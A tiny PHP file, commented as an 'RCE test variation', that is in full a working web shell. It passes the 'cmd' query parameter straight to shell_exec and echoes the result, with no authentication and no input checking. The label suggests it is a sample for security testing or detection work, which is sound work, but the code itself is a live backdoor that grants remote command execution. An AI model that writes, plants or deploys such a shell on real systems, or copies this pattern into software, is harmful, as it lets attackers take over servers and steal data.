<?php
// RCE test variation #669
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>